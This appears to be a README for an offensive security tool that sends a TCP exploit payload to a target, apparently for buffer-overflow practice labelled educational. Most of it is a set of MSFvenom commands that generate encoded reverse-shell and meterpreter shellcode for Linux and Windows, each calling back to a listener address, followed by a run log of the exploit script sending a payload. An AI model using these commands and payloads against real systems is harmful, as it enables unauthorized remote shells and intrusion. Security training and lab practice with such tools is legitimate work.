# Send TCP Payload

Send a payload through TCP.

Tested on Kali Linux v2023.1 (64-bit).

Made for educational purposes. I hope it will help!

## How to Run

**Change the IP address, port number, and payload inside the scripts as necessary.**

Open your preferred console from [/src/](https://github.com/ivan-sincek/send-tcp-payload/tree/master/src) and run the following Bash command:

```fundamental
python3 exploit.py
```

## JMP ESP

To do.

## Generate a Reverse Shell Payload

To generate a reverse shell payload for `Linux OS`, use one of the following MSFvenom commands (modify them to your need):

```fundamental
msfvenom --platform linux -a x86 -e x86/shikata_ga_nai -p linux/x86/shell_reverse_tcp LHOST=192.168.8.185 PORT=9000 EXITFUNC=thread -f python -b \x00\x0a\x0d\xff

msfvenom --platform linux -a x64 -e x64/xor -p linux/x64/shell_reverse_tcp LHOST=192.168.8.185 PORT=9000 EXITFUNC=thread -f python -b \x00\x0a\x0d\xff

msfvenom --platform linux -a x86 -e x86/shikata_ga_nai -p linux/x86/meterpreter_reverse_tcp LHOST=192.168.8.185 PORT=9000 EXITFUNC=thread -f python

msfvenom --platform linux -a x64 -e x64/xor -p linux/x64/meterpreter_reverse_tcp LHOST=192.168.8.185 PORT=9000 EXITFUNC=thread -f python
```

To generate a reverse shell payload for `Windows OS`, use one of the following MSFvenom commands (modify them to your need):

```fundamental
msfvenom --platform windows -a x86 -e x86/shikata_ga_nai -p windows/shell_reverse_tcp LHOST=192.168.8.185 LPORT=9000 EXITFUNC=thread -f python -b \x00\x0a\x0d\xff

msfvenom --platform windows -a x64 -e x64/xor -p windows/x64/shell_reverse_tcp LHOST=192.168.8.185 LPORT=9000 EXITFUNC=thread -f python -b \x00\x0a\x0d\xff

msfvenom --platform windows -a x86 -e x86/shikata_ga_nai -p windows/meterpreter_reverse_tcp LHOST=192.168.8.185 LPORT=9000 EXITFUNC=thread -f python

msfvenom --platform windows -a x64 -e x64/xor -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.8.185 LPORT=9000 EXITFUNC=thread -f python
```

## Runtime

```fundamental
┌──(root💀kali)-[~/Desktop]
└─# python3 exploit.py
Connecting to the target 192.168.8.185:9000
Sending the payload... Size in bytes: 348

Waiting for the response...
Waiting for the response timed out
No response has been received or is empty
```
